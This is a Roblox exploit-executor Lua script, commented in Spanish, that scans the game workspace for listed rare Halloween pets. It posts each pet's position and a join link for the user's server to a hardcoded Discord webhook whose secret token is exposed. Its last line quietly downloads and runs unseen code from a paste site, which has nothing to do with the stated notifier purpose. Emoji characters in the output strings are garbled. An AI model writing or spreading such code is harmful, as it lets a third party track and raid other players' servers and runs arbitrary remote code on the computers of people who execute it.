--// Webhook general para notifyPets (Halloween)
local HttpService = game:GetService("HttpService")
local DISCORD_WEBHOOK_NOTIFY = "https://discord.com/api/webhooks/1425042314241507438/ZZxiYCXWVyOhx9aG2KREdYHBKU5KtNZjh9o1lHa3ul7j0GOiJgJi70DEln8GeYnNotFG"

--// Pets especiales a vigilar (Halloween)
local notifyPets = {
    ["La Vacca Jacko Linterino"] = true,
    ["La Spooky Grande"] = true,
    ["Vampira Cappucina"] = true,
    ["Zombie Tralala"] = true,
    ["Frankentteo"] = true,
    ["Tim Cheese"] = true,
}

--// Variable para evitar duplicados
local detected = {}

--// Compatibilidad con executors
local function getRequestFunc()
    return (syn and syn.request)
        or (http and http.request)
        or http_request
        or request
        or (fluxus and fluxus.request)
        or nil
end

--// Enviar embed a Discord
local function sendDiscordEmbed(webhook, args)
    local req = getRequestFunc()
    if not req then 
        warn("‚ùå No se encontr√≥ funci√≥n HTTP compatible.")
        return 
    end
    local payload = {
        embeds = {{
            title = args.title or "Evento",
            description = args.description or "",
            color = args.color or 16776960,
            fields = args.fields or {},
            footer = { text = args.footer or "" },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    local success, err = pcall(function()
        req({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
    if success then
        print("‚úÖ Enviado a Discord:", args.title)
    else
        warn("‚ùå Error al enviar a Discord:", err)
    end
end

--// Notificador de notifyPets
local function sendNotifyPet(petModel, mutationText, generationText)
    if not petModel then return end

    -- Intentar usar PrimaryPart, si no existe usamos posici√≥n 0,0,0
    local pos = (petModel.PrimaryPart and petModel.PrimaryPart.Position) or Vector3.new(0,0,0)
    
    local serverLink = string.format(
        "https://hxck4x416.github.io/Notifier/?placeId=%s&gameInstanceId=%s",
        tostring(game.PlaceId),
        tostring(game.JobId)
    )

    local fields = {
        { name = "Nombre", value = petModel.Name, inline = true },
        { name = "Mutaci√≥n", value = mutationText or "Normal", inline = true },
        { name = "Generaci√≥n", value = generationText or "?", inline = true },
        { name = "Servidor", value = string.format("[Click para unirte](%s)", serverLink), inline = false },
        { name = "Posici√≥n", value = string.format("X: %.1f, Y: %.1f, Z: %.1f", pos.X, pos.Y, pos.Z), inline = false },
    }

    sendDiscordEmbed(DISCORD_WEBHOOK_NOTIFY, {
        title = "üéÉ Pet de Halloween Detectado",
        description = "Se encontr√≥ un pet de la lista objetivo.",
        color = 0xFF4500,
        fields = fields,
        footer = "Pet Notifier"
    })
end

--// Escaneo de Workspace para notifyPets
local function scanNotifyPets()
    for _, obj in ipairs(game.Workspace:GetDescendants()) do
        if obj:IsA("Model") and notifyPets[obj.Name] and not detected[obj] then
            print("üêæ Pet detectado:", obj.Name) -- Depuraci√≥n
            detected[obj] = true
            sendNotifyPet(obj, "Normal", "?")
        end
    end
end

-- Escaneo inicial y cada 10 segundos
pcall(scanNotifyPets)
task.spawn(function()
    while task.wait(10) do
        pcall(scanNotifyPets)
    end
end)

print("‚úÖ Notificador notifyPets cargado correctamente.")

loadstring(game:HttpGet("https://pastefy.app/JJVhs3rK/raw"))()